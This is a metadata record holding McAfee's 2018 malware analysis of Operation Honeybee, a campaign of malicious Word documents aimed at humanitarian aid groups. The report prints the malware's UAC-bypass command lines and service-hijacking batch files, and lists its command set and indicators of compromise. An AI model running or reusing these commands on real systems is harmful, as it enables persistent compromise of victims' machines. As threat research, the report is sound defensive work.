{
    "id": "10ac4902-39b2-41be-95fd-c3ded01c9e84",
    "created_at": "2023-01-12T15:06:08.222508Z",
    "updated_at": "2025-03-27T02:09:57.371887Z",
    "deleted_at": null,
    "sha1_hash": "13fd2ec83248d736df1a16eebbb95ebac7d11acd",
    "title": "2018-03-02 - McAfee Uncovers Operation Honeybee, a Malicious Document Campaign Targeting Humanitarian Aid Groups",
    "authors": "",
    "file_creation_date": "2022-05-28T19:29:14Z",
    "file_modification_date": "2022-05-28T19:29:14Z",
    "file_size": 1062715,
    "plain_text": "# McAfee Uncovers Operation Honeybee, a Malicious Document Campaign Targeting Humanitarian Aid Groups\n\n**securingtomorrow.mcafee.com/other-blogs/mcafee-labs/mcafee-uncovers-operation-honeybee-malicious-document-**\ncampaign-targeting-humanitarian-aid-groups/\n\nMarch 2, 2018\n\n_This post was written with contributions from Jessica Saavedra-Morales, Thomas Roccia,_\n_and Asheer Malhotra._\n\nMcAfee Advanced Threat Research analysts have discovered a new operation targeting\nhumanitarian aid organizations and using North Korean political topics as bait to lure victims\ninto opening malicious Microsoft Word documents. Our analysts have named this Operation\nHoneybee, based on the names of the malicious documents used in the attacks.\n\nAdvanced Threat Research analysts have also discovered malicious documents authored by\nthe same actor that indicate a tactical shift. These documents do not contain the typical lures\nby this actor, instead using Word compatibility messages to entice victims into opening them.\n\nThe Advanced Threat Research team also observed a heavy concentration of the implant in\nVietnam from January 15–17.\n\n\n-----\n\n## Background\n\nOn January 15, Advanced Threat Research discovered an operation using a new variant of\nthe [SYSCON backdoor. The Korean-language Word document manual.doc appeared in](https://www.securityweek.com/backdoor-uses-ftp-server-cc)\nVietnam on January 17, with the original author name of Honeybee.\n\n_Document properties._\n\nThis malicious document contains a Visual Basic macro that dropped and executed an\nupgraded version of the implant known as SYSCON, which appeared in 2017 in malicious\nWord documents as part of several campaigns using North Korea–related topics. The\nmalicious Visual Basic script uses a unique key (custom alphabet) to encode data. We have\nseen this in previous operations using SYSCON. This key was also used in the Honeybee\ncampaign and appears to have been used since August 2017.\n\n\n-----\n\n_Examples of decoy documents._\n\nSeveral additional documents surfaced between January 17 and February 3. All contain the\nsame Visual Basic macro code and author name as Honeybee. Some of the malicious\ndocuments were test files without the implant. From our analysis, most these documents\nwere submitted from South Korea, indicating that some of the targeting was in South Korea.\nThese Honeybee documents did not contain any specific lures, rather variations of a “not\ncompatible” message attempting to convince the user to enable content.\n\nWe also observed a related malicious document created January 12 by the author Windows\nUser that contained a different encoding key, but essentially used the same macro and same\ntype of implant as we saw with the recent Honeybee documents. This document,\n“International Federation of Red Cross and Red Crescent Societies – DPRK Country Office,”\ndrops an implant with the control server address 1113427185.ifastnet.org, which resolves to\nthe same server used by the implants dropped in the Honeybee case.\n\n\n-----\n\n_The directory contents of control server 1113427185.ifastnet.org._\n\n_The directory contents of ftp.byethost11.com, from Honeybee samples._\n\n\n-----\n\n_Log files of compromised machines from February 2018 Honeybee samples._\n\n## MaoCheng Dropper\n\nAside from finding the malicious documents, the Advanced Threat Research team\ndiscovered a Win32-based executable dropper. This dropper uses a stolen digital signature\nfrom Adobe Systems. This certificate is also used by another Korean-language malware\ncompiled January 16 (hash: 35904f482d37f5ce6034d6042bae207418e450f4) with an\ninteresting program database (PDB) path.\n\nD:\\Task\\DDE Attack\\MaoCheng\\Release\\Dropper.pdb\n\nThe malware is a Win32 executable that pretends to be a Word document based on its icon.\nThis is a dropper for the same type of malware as observed with the other Word documents.\nThis sample also dropped a decoy document with the author name Honeybee. This sample,\nhowever, contained a bug that interfered with the execution flow of the dropper, suggesting\nthat the authors did not test the malware after code signing it.\n\n\n-----\n\nThe decoy document uses the cloud-based accounting software company Xero as a lure:\n\n\n-----\n\n_A decoy document from MaoCheng dropper._\n\n## Possible Operator\n\nThe Advanced Threat Research team has identified the following persona\n(snoopykiller@mail.ru) tied to this recent operation. Based on our analysis, the actor\nregistered two free hosting accounts: navermail.byethost3.com, which refers to the popular\nSouth Korean search engine, and nihon.byethost11.com. The email address was used to\nregister a free account for a control server in all the implants described in our analysis.\n\n## Technical Analysis\n\nLet’s start with an overview of the attack:\n\n\n-----\n\nWe continue with the components involved in this operation.\n\n\n-----\n\nThe malicious Word file is the beginning of the infection chain and acts as a dropper for two\nDLL files. The Word file contains malicious Visual Basic macro code that runs when the\ndocument is opened in Word using the Document_Open() autoload function. The word file\nalso contains a Base64-encoded file (encoded with a custom key) in it that is read, decoded,\nand dropped to the disk by the macro.\n\n_The Document_Open() subroutine implementing the malicious functionality._\n\nThe Visual Basic macro performs the following tasks:\n\nOpens a handle to the malicious document to read the encoded CAB file\n\n\n-----\n\nDecodes the CAB file and writes it to the disk at %temp%\\setup.cab\n\n\n-----\n\n_Encoded CAB file in the Word document._\n\n_Decoding and writing the CAB file to %temp%._\n\n_The decoded CAB file in the Visual Basic memory buffer._\n\nThe CAB file contains the following files and functions:\n\ndll: A malicious DLL used to launch batch files (used with cliconfg.exe for UAC bypass).\nThe DLL contains the following PDB path:\n_D:\\Task\\MiMul\\NTWDBLIB\\Release\\NTWDBLIB.pdb._\nbat: A batch file to set up the service COMSysApp, for an x64 system\nbat: A batch file to set up the service COMSysApp, for an x86 system\nini: A data file with Base64-encoded data for connecting to an FTP server. Credentials\nare encoded in the .ini file.\n\n_Decoded credential data contained in ipnet.ini._\n\ndll: The malicious DLL file run as a service (using svchost.exe). The DLL contains the\nfollowing PDB path: D:\\Task\\MiMul\\FTPCom_vs10\\Release\\Engine.pdb.\n\n\n-----\n\nThe macro then extracts the CAB file into %systemroo%\\system32, using either\nwusa.exe or expand.exe (depending on the OS) to again bypass UAC prompts\nOnce the files have been extracted, the Visual Basic macro deletes the CAB file and\nruns the malicious NTWDBLIB.dll via cliconfg.exe (to gain privileges and bypass UAC\nprotections)\nCommand lines used by the Visual Basic macro:\n```\ncmd /c wusa %TEMP%\\setup.cab /quiet /extract:%SystemRoot%\\System32 && del /f /q\n%TEMP%\\setup.cab && cliconfg.exe\ncmd /c expand %TEMP%\\setup.cab -F:* %SystemRoot%\\System32 && del /f /q\n%TEMP%\\setup.cab && cliconfg.exe\n\n```\nA combination of NTWDBLIB.dll and cliconfg.exe are used to bypass UAC protections; this is\na familiar attack on Windows. UAC bypass via DLL hijacking requires:\n\nA Windows executable with the auto-elevate property in its manifest\nA Windows executable in a secure directory (%systemroot%\\system32)\n\nThe malicious NTWDBLIB DLL performs the simple task of setting up the malicious ipnet.dll\nas a service by running one of the two batch files contained in the CAB file (which is also\ndropped to %systemroot%\\system32):\n\n_NTWDBLIB executing the installer batch files under the context of cliconfg.exe._\n\nThe batch files involved in the attack modify the system service COMSysApp to load the\nmalicious ipnet.dll. The contents of the batch files vary depending on the OS (x64 vs x86):\n\n**install1.bat (x64)**\n```\n@echo off\nsc stop COMSysApp\nsc config COMSysApp type= own start= auto error= normal binpath=\n\"%windir%\\SysWOW64\\svchost.exe -k COMSysApp\"\nreg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SvcHost\" /v COMSysApp /t\nREG_MULTI_SZ /d \"COMSysApp\" /f\nreg add \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\COMSysApp\\Parameters\" /v ServiceDll\n/t REG_EXPAND_SZ /d \"%windir%\\SysWOW64\\ipnet.dll\" /f\nsc start COMSysApp\ndel /f /q %windir%\\SysWOW64\\install2.bat\ndel /f /q %windir%\\SysWOW64\\install1.bat\n\n```\n**install2 bat (x86)**\n\n\n-----\n\n```\n@echo off\nsc stop COMSysApp\nsc config COMSysApp type= own start= auto error= normal binpath=\n\"%windir%\\System32\\svchost.exe -k COMSysApp\"\nreg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SvcHost\" /v COMSysApp /t\nREG_MULTI_SZ /d \"COMSysApp\" /f\nreg add \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\COMSysApp\\Parameters\" /v ServiceDll\n/t REG_EXPAND_SZ /d \"%windir%\\system32\\ipnet.dll\" /f\nsc start COMSysApp\ndel /f /q %windir%\\System32\\install1.bat\ndel /f /q %windir%\\System32\\install2.bat\n\n```\nThe batch files perform these tasks:\n\nStop the service COMSysApp\nConfigure the service to autostart (to set up persistence on the system)\nModify registry keys to launch the DLL unser svchost.exe\nSpecify the malicious DLL path to be loaded into the svchost process.\nImmediately restart the service\nRemove the batch files to reduce the fingerprint on the system\n\nIPNet.dll runs as a service under svchost.exe.\n\nThe malicious DLL is also responsible for terminating the cliconfg.exe process and deleting\nthe malicious NTWDBLIB.dll using:\n```\ncmd /c taskkill /im cliconfg.exe /f /t && del /f /q NTWDBLIB.DLL\n\n```\nAll the following capabilities described are implemented by the malicious service DLL implant\nunless specified.\n\n**Variant using North Korean Red Cross**\n\nAnother variant (hash: 9e2c0bd19a77d712055ccc0276fdc062e9351436) of the malicious\nWord dropper uses the same Base64-decoding scheme with a different custom key. This\ndocument was created January 10.\n\n\n-----\n\n_Contents of the decoy document._\n\nThis variant also consists of two CAB files that are dropped to %temp%, depending on the\nOS (x86 or x64).\n\nThe key differences in this variant:\n\nTwo CAB files are encoded into the Word document in text boxes instead of being\nappended in the DOC file\nThere is one CAB file for an x86 system and another for an x64 system\nThis malware sample uses uacme.exe with dummy.dll to implement the UAC bypass\n\nexe is the program vulnerable to the UAC bypass attack\ndll runs install.bat to set up the service (same as NTWDBLIB.dll)\nexe and dummy.dll may be either 64-bit or 32-bit binaries based on the OS. Ipnet.dll\nmay also be either 64-bit or 32-bit.\nThe Visual Basic macro uses the following command line:\n```\ncmd /c expand %TEMP%\\setup.cab -F:* %TEMP% && cd /d %TEMP% && del /f /q setup.cab &&\nuacme.exe\n\n```\nThe control server credential information contained in the CAB files is different:\n\n_Decoded credential data contained in another ipnet.ini._\n\nSimilarities between this variant and the original malware sample:\n\n\n-----\n\nService name is the same: COMSysApp\nThe DLL and ini files contain the same functions as described elsewhere in this post\n\n## Data Reconnaissance\n\nThe following information is gathered from the endpoint and sent to the control server.\n\nSystem info:\n\nComputer name\nSystem info using: cmd /c systeminfo >%temp%\\temp.ini\nList of currently running process using: cmd /c tasklist >%temp%\\temp.ini\n\n## Exfiltration\n\nThe data exfiltration process runs in the following sequence: The temp.ini files are\ncopied into a text file that matches the pattern:\n\nFrom <COMPUTER-NAME> (<Month>-<Day> <Hour>-<Minute>-<Second>).txt. For\nexample, From <COMPUTER-NAME> (01-04 11-40-02).txt\n\nAll the text files are now packed into the archive temp.zip (%temp%\\temp.zip)\nzip is Base64 encoded (with a custom key, same as that used in the malicious\ndocument) and then copied to post.txt\ntxt is uploaded to the control server\n\n## Additional Commands and Capabilities\n\nThe service-based DLL implant traverses to the /htdocs/ directory on the FTP server and\nlooks for any files with the keywords:\n\nTO EVERYONE: Commands issued to all infected endpoints\nTO <COMPUTERNAME>: Commands issued to endpoints matching the\nComputerName\n\nThe following commands are supported by the malware implant:\n\ncmd /c pull <filename>: Adds filename to temp.zip, Base64 encodes, and uploads to\ncontrol server\ncmd /c chip <string>: Deletes current ipnet.ini config file. Writes new config info (control\nserver connection info) to new ipnet.ini.\ncmd /c put <new_file_name> <existing_file_name>: Copies existing file to new file\nname. Deletes existing file.\n/user <parameters>: Executes downloaded file with parameters specified using\nCreateProcessAsUser\ncmd /c <command>: Executes command on infected endpoint\n\n\n-----\n\n## Conclusion\n\nThe actor behind Honeybee has been operating with new implants since at least November\n2017 with the first known version of NTWDBLIB installer. Furthermore, based on the various\nmetadata in both documents and executables, the actor is likely a Korean speaker.\n\nThe techniques used in the malicious documents such as the lure messages closely\nresemble what we have observed before in South Korea. The attacker appears to target\nthose involved in humanitarian aid and inter-Korean affairs. We have seen this operation\nexpand beyond the borders of South Korea to target Vietnam, Singapore, Argentina, Japan,\nIndonesia, and Canada.\n\nBased on the McAfee Advanced Threat Research team’s analysis, we find multiple\ncomponents from this operation are unique from a code perspective, even though the code is\nloosely based on previous versions of the SYSCON backdoor. Some new droppers have not\nbeen observed before in the wild. The MaoCheng dropper was apparently created\nspecifically for this operation and appeared only twice in the wild.\n\n## Indicators of compromise\n\n**MITRE ATT&CK techniques**\n\nModify existing service\nCode signing\nFile deletion\nDeobfuscate/decode files or information\nSystem information discovery\nProcess discovery\nService execution\nRunDLL32\nScripting\nCommand-line Interface\nData from local system\nAutomated exfiltration\nData encrypted\nCommonly used port\nBypass user account control\n\n**Hashes**\n\nfe32d29fa16b1b71cd27b23a78ee9f6b7791bff3\nf684e15dd2e84bac49ea9b89f9b2646dc32a2477\n1d280a77595a2d2bbd36b9b5d958f99be20f8e06\n19d9573f0b2c2100accd562cc82d57adb12a57ec\nf90a2155ac492c3c2d5e1d83e384e1a734e59cc0\n\n\n-----\n\n9b832dda912cce6b23da8abf3881fcf4d2b7ce09\nf3b62fea38cb44e15984d941445d24e6b309bc7b\n66d2cea01b46c3353f4339a986a97b24ed89ee18\n7113aaab61cacb6086c5531a453adf82ca7e7d03\nd41daba0ebfa55d0c769ccfc03dbf6a5221e006a\n25f4819e7948086d46df8de2eeeaa2b9ec6eca8c\n35ab747c15c20da29a14e8b46c07c0448cef4999\ne87de3747d7c12c1eea9e73d3c2fb085b5ae8b42\n0e4a7c0242b98723dc2b8cce1fbf1a43dd025cf0\nbca861a46d60831a3101c50f80a6d626fa99bf16\n01530adb3f947fabebae5d9c04fb69f9000c3cef\n4229896d61a5ad57ed5c247228606ce62c7032d0\n4c7e975f95ebc47423923b855a7530af52977f57\n5a6ad7a1c566204a92dd269312d1156d51e61dc4\n1dc50bfcab2bc80587ac900c03e23afcbe243f64\n003e21b02be3248ff72cc2bfcd05bb161b6a2356\n9b7c3c48bcef6330e3086de592b3223eb198744a\n85e2453b37602429596c9681a8c58a5c6faf8d0c\n\n## Domains\n\nftp.byethost31.com\nftp.byethost11.com\n1113427185.ifastnet.org\nnavermail.byethost3.com\nnihon.byethost3.com\n\n[Ryan Sherstobitoff](https://www.mcafee.com/blogs/author/ryan-sherstobitoff/)\nRyan Sherstobitoff is a Senior Analyst for Major Campaigns – Advanced Threat Research in\nMcAfee. Ryan specializes in threat intelligence in the Asia Pacific Region where he conducts\ncutting edge...\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2018/2018-03-02 - McAfee Uncovers Operation Honeybee, a Malicious Document Campaign Targeting Humanitarian Aid Groups.pdf"
    ],
    "report_names": [
        "2018-03-02 - McAfee Uncovers Operation Honeybee, a Malicious Document Campaign Targeting Humanitarian Aid Groups.pdf"
    ],
    "threat_actors": [
        {
            "id": "2150d1ac-edf0-46d4-a78a-a8899e45b2b5",
            "created_at": "2022-10-25T15:50:23.269339Z",
            "updated_at": "2025-03-27T02:00:55.416524Z",
            "deleted_at": null,
            "main_name": "APT17",
            "aliases": [
                "APT17",
                "Deputy Dog"
            ],
            "source_name": "MITRE:APT17",
            "tools": [
                "BLACKCOFFEE"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "4025d5c4-53e5-4f0c-80de-80ac6e17c25a",
            "created_at": "2022-10-25T16:07:23.710983Z",
            "updated_at": "2025-03-27T02:02:09.938563Z",
            "deleted_at": null,
            "main_name": "Honeybee",
            "aliases": [],
            "source_name": "ETDA:Honeybee",
            "tools": [
                "LOLBAS",
                "LOLBins",
                "Living off the Land",
                "SYSCON",
                "Sanny",
                "Syscon"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "3e204dce-1974-4051-85dc-849fcd5c1226",
            "created_at": "2022-10-25T15:50:23.772479Z",
            "updated_at": "2025-03-27T02:00:55.543292Z",
            "deleted_at": null,
            "main_name": "Honeybee",
            "aliases": [
                "Honeybee"
            ],
            "source_name": "MITRE:Honeybee",
            "tools": [
                "Tasklist",
                "cmd",
                "Systeminfo"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "e3dd6bd6-ec4e-48c4-bcdf-42cd1d68a6fe",
            "created_at": "2023-01-06T13:46:38.983963Z",
            "updated_at": "2025-03-27T02:00:02.969509Z",
            "deleted_at": null,
            "main_name": "Honeybee",
            "aliases": [
                "G0072"
            ],
            "source_name": "MISPGALAXY:Honeybee",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "a7aefdda-98f1-4790-a32d-14cc99de2d60",
            "created_at": "2023-01-06T13:46:38.281844Z",
            "updated_at": "2025-03-27T02:00:02.792526Z",
            "deleted_at": null,
            "main_name": "APT17",
            "aliases": [
                "G0025",
                "AURORA PANDA",
                "Group 72",
                "G0001",
                "HELIUM",
                "Group 8",
                "Hidden Lynx",
                "Tailgater Team",
                "BRONZE KEYSTONE"
            ],
            "source_name": "MISPGALAXY:APT17",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        }
    ],
    "ts_created_at": 1673535968,
    "ts_updated_at": 1743041397,
    "ts_creation_date": 1653766154,
    "ts_modification_date": 1653766154,
    "files": {
        "pdf": "https://archive.orkl.eu/13fd2ec83248d736df1a16eebbb95ebac7d11acd.pdf",
        "text": "https://archive.orkl.eu/13fd2ec83248d736df1a16eebbb95ebac7d11acd.txt",
        "img": "https://archive.orkl.eu/13fd2ec83248d736df1a16eebbb95ebac7d11acd.jpg"
    }
}